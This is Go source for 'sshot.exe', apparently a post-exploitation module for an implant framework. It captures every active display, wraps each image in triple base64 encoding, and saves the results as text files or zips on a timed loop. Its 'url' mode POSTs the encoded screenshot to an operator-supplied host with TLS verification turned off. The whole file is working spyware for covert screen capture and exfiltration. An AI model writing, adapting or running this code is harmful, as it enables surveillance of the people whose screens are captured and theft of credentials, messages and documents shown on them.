package main

import (
	"archive/zip"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"image"
	"image/color"
	"image/draw"
	"image/jpeg"
	"image/png"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"time"

	//{{if .Config.Debug}}
	"log"
	//{{end}}
	screen "github.com/kbinani/screenshot"
)

var Compression = false //open Compression

func main() {
	switch len(os.Args) {
	case 1:
		fmt.Println("sshot.exe start")
		fmt.Println("sshot.exe url http://xxxxx")
		fmt.Println("sshot.exe [count] [sleeptime /s]")
		fmt.Println("\nDecrypt txt:")
		fmt.Println("sshot.exe b64 [txt filename]\n")
		return
	case 2:
		if os.Args[1] == "-h" || os.Args[1] == "help" {
			fmt.Println("sshot.exe start")
			fmt.Println("sshot.exe url http://xxxxx")
			fmt.Println("sshot.exe [count] [sleeptime /s]")
			fmt.Println("\nDecrypt txt:")
			fmt.Println("sshot.exe b64 [txt filename]\n")
			return
		}

		if os.Args[1] == "start" {
			shotPic := Screenshot()
			picname := string("pic_"+strconv.Itoa(int(time.Now().UnixMilli()))) + ".txt"
			e := ioutil.WriteFile(picname, []byte(cusBase64encoded(shotPic)), 0644)
			if e != nil {
				return
			}
			/*
				var zipname string
				zipfile := zipData([]string{picname})
				if zipfile != nil {
					zipname = string("zip_"+strconv.Itoa(int(time.Now().UnixMilli()))) + ".zip"
					e = ioutil.WriteFile(zipname, zipfile, 0644)
					if e != nil {
						return
					}
				}

			*/
			fmt.Println("Output: " + picname)
			//fmt.Println("Output: " + zipname)
			return
		}

	case 3:
		if os.Args[1] == "b64" {
			fn := os.Args[2]
			fb64, _ := ioutil.ReadFile(fn)

			rawpic := cusBase64decode(string(fb64))
			picname := fn + ".png"
			e := ioutil.WriteFile(picname, rawpic, 0644)
			if e != nil {
				return
			}

			fmt.Println("Output: " + picname)
			return
		}

		//todo: Change to winhttp
		if os.Args[1] == "url" {
			shotPic := Screenshot()
			httpPost([]byte(cusBase64encoded(shotPic)), os.Args[2])
			//fmt.Println(cusBase64encoded(shotPic))
			return
		}

		var piclist []string
		count, e := strconv.Atoi(os.Args[1])
		if e != nil {
			return
		}
		freq, e := strconv.Atoi(os.Args[2])
		if e != nil {
			return
		}
		for i := 0; i < count; i++ {
			shotPic := Screenshot()
			picname := string("pic_"+strconv.Itoa(int(time.Now().UnixMilli()))) + ".txt"
			piclist = append(piclist, picname)
			e := ioutil.WriteFile(picname, []byte(cusBase64encoded(shotPic)), 0644)
			if e != nil {
				return
			}
			fmt.Println("Output: " + picname)
			time.Sleep(time.Duration(freq) * time.Second)
		}
		zipfile := zipData(piclist)
		if zipfile != nil {
			zipname := string("zip_"+strconv.Itoa(int(time.Now().UnixMilli()))) + ".zip"
			e := ioutil.WriteFile(zipname, zipfile, 0644)
			if e != nil {
				return
			}
			fmt.Println("Output: " + zipname)
		}
	}
}

func httpPost(content []byte, url string) {
	req, _ := http.NewRequest(http.MethodPost, url, bytes.NewReader(content))
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cli := http.Client{
		Timeout:   time.Second * 3, // Set 10ms timeout.
		Transport: tr,
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	cli.Do(req)
}

func cusBase64decode(b64 string) []byte {
	var decoded []byte
	decoded, _ = base64.StdEncoding.DecodeString(b64)
	sum := 1
	for i := 1; i < 3; i++ {
		decoded, _ = base64.StdEncoding.DecodeString(string(decoded))
		sum += i
	}
	return decoded

}

func cusBase64encoded(b64 []byte) string {
	encoded := base64.StdEncoding.EncodeToString(b64)
	sum := 1
	for i := 1; i < 3; i++ {
		encoded = base64.StdEncoding.EncodeToString([]byte(encoded))
		sum += i
	}
	return encoded

}

// Screenshot - Retrieve the screenshot of the active displays
func Screenshot() []byte {
	if Compression {
		return compressImageResource(WindowsCapture())
	}
	return WindowsCapture()
}

// compressImageResource - Image Compression..
func compressImageResource(data []byte) []byte {
	imgSrc, _, err := image.Decode(bytes.NewReader(data))
	if err != nil {
		return data
	}
	newImg := image.NewRGBA(imgSrc.Bounds())
	draw.Draw(newImg, newImg.Bounds(), &image.Uniform{C: color.White}, image.Point{}, draw.Src)
	draw.Draw(newImg, newImg.Bounds(), imgSrc, imgSrc.Bounds().Min, draw.Over)
	buf := bytes.Buffer{}
	err = jpeg.Encode(&buf, newImg, &jpeg.Options{Quality: 40})
	if err != nil {
		return data
	}
	if buf.Len() > len(data) {
		return data
	}
	return buf.Bytes()
}

// WindowsCapture - Retrieve the screenshot of the active displays
func WindowsCapture() []byte {
	nDisplays := screen.NumActiveDisplays()

	var height, width int = 0, 0
	for i := 0; i < nDisplays; i++ {
		rect := screen.GetDisplayBounds(i)
		if rect.Dy() > height {
			height = rect.Dy()
		}
		width += rect.Dx()
	}
	img, err := screen.Capture(0, 0, width, height)

	//{{if .Config.Debug}}
	//log.Printf("Error Capture: %s", err)
	//{{end}}

	var buf bytes.Buffer
	if err != nil {
		//{{if .Config.Debug}}
		log.Println("Capture Error")
		//{{end}}
		return buf.Bytes()
	}

	png.Encode(&buf, img)
	return buf.Bytes()
}

func zipData(Src []string) []byte {
	// Create a buffer to write our archive to.

	buf := new(bytes.Buffer)
	// Create a new zip archive.
	zipWriter := zip.NewWriter(buf)

	for _, v := range Src {

		// write tmp.exe in zip file
		zipFile, err := zipWriter.Create(v)
		if err != nil {
			continue
		}
		fbyte, err := ioutil.ReadFile(v)
		if err != nil {
			continue
		}
		_, err = zipFile.Write(fbyte)
		if err != nil {
			continue
		}
	}

	// Make sure to check the error on Close.
	err := zipWriter.Close()
	if err != nil {
		return nil
	}

	return buf.Bytes()

}
